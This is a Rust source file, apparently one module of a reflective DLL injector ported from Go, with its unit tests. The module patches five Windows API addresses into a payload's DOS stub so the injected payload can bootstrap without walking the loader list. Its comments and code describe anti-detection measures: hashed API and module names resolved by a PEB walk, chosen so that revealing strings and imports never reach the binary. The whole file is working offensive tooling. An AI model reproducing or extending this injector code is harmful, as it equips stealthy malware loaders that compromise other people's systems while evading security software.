//! Pre-resolved import patching (Go: `patchPreresolvedImports` in
//! `utils/injector/reflective_windows.go`).
//!
//! Writes five raw function addresses into the payload's DOS stub at the
//! scratch region offsets (`crate::payload::IMP_*_OFFSET`) so Bootstrap skips
//! PEB.Ldr traversal. Validity relies on KnownDlls + session-consistent ASLR:
//! kernel32 and ntdll share addresses across processes spawned in the same
//! boot session.
//!
//! The five addresses are now resolved via [`crate::resolve`] — a PEB walk +
//! in-memory export scan with hashed names — so the binary no longer imports
//! `GetModuleHandleA`/`GetProcAddress` (wave-2 import-combo reduction).

use std::fmt;

use crate::payload;
use crate::resolve::{api, hash_bytes, hash_mod_bytes};

/// Patch failure — all variants carry enough context to tell a corrupt payload
/// from a broken toolchain.
#[derive(Debug)]
pub enum PatchError {
    TooSmall(usize),
    MissingImport(&'static str),
}

impl fmt::Display for PatchError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            PatchError::TooSmall(len) => {
                write!(
                    f,
                    "injector: payload too small for pre-resolved import patch ({len})"
                )
            }
            PatchError::MissingImport(name) => {
                write!(f, "injector: failed to resolve pre-resolved import {name}")
            }
        }
    }
}

impl std::error::Error for PatchError {}

// Module hashes are precomputed at compile time from byte literals so the DLL
// names never reach the image as strings. Export names are kept in `SPECS`
// only because `PatchError::MissingImport` reports them.
const MOD_KERNEL32: u32 = hash_mod_bytes(b"kernel32.dll");
const MOD_NTDLL: u32 = hash_mod_bytes(b"ntdll.dll");

/// Resolve one export address by hashed names (no strings in the binary).
fn module_export_addr(module_hash: u32, export: &str) -> Option<usize> {
    api(module_hash, hash_bytes(export.as_bytes()))
}

/// Port of `patchPreresolvedImports`: copy `payload` and write the five
/// function pointers (Go: `AddrLoadLibraryA` … `AddrNtFlushInstructionCache`).
pub fn patch_preresolved_imports(payload: &[u8]) -> Result<Vec<u8>, PatchError> {
    let need = payload::IMP_NTFLUSHIC_OFFSET + 8;
    if payload.len() < need {
        return Err(PatchError::TooSmall(payload.len()));
    }

    const SPECS: [(&str, u32); 5] = [
        ("LoadLibraryA", MOD_KERNEL32),
        ("GetProcAddress", MOD_KERNEL32),
        ("VirtualAlloc", MOD_KERNEL32),
        ("VirtualProtect", MOD_KERNEL32),
        ("NtFlushInstructionCache", MOD_NTDLL),
    ];
    let mut addrs = [0usize; 5];
    for (i, (export, module)) in SPECS.iter().enumerate() {
        let Some(addr) = module_export_addr(*module, export) else {
            return Err(PatchError::MissingImport(export));
        };
        addrs[i] = addr;
    }

    let mut patched = payload.to_vec();
    let offsets = [
        payload::IMP_LOADLIBRARYA_OFFSET,
        payload::IMP_GETPROCADDRESS_OFFSET,
        payload::IMP_VIRTUALALLOC_OFFSET,
        payload::IMP_VIRTUALPROTECT_OFFSET,
        payload::IMP_NTFLUSHIC_OFFSET,
    ];
    for (off, addr) in offsets.iter().zip(addrs.iter()) {
        patched[*off..*off + 8].copy_from_slice(&addr.to_le_bytes());
    }
    Ok(patched)
}

#[cfg(test)]
mod tests {
    use super::*;

    use crate::payload::PAYLOAD_AMD64;

    #[test]
    fn resolved_addresses_are_nonzero_in_this_process() {
        // The ASLR/KnownDlls contract is machine-local; on the dev box these
        // five addresses must resolve before anything is spawned.
        assert!(module_export_addr(MOD_KERNEL32, "LoadLibraryA").is_some());
        assert!(module_export_addr(MOD_KERNEL32, "GetProcAddress").is_some());
        assert!(module_export_addr(MOD_KERNEL32, "VirtualAlloc").is_some());
        assert!(module_export_addr(MOD_KERNEL32, "VirtualProtect").is_some());
        assert!(module_export_addr(MOD_NTDLL, "NtFlushInstructionCache").is_some());
    }

    #[test]
    fn patched_payload_has_five_nonzero_pointers() {
        let patched = patch_preresolved_imports(PAYLOAD_AMD64).unwrap();
        for off in [
            payload::IMP_LOADLIBRARYA_OFFSET,
            payload::IMP_GETPROCADDRESS_OFFSET,
            payload::IMP_VIRTUALALLOC_OFFSET,
            payload::IMP_VIRTUALPROTECT_OFFSET,
            payload::IMP_NTFLUSHIC_OFFSET,
        ] {
            let v = u64::from_le_bytes(patched[off..off + 8].try_into().unwrap());
            assert!(v != 0, "slot {off:#x} patched with a real address");
        }
    }

    #[test]
    fn tiny_payload_rejected() {
        assert!(matches!(
            patch_preresolved_imports(&[0u8; 0x40]),
            Err(PatchError::TooSmall(_))
        ));
    }
}
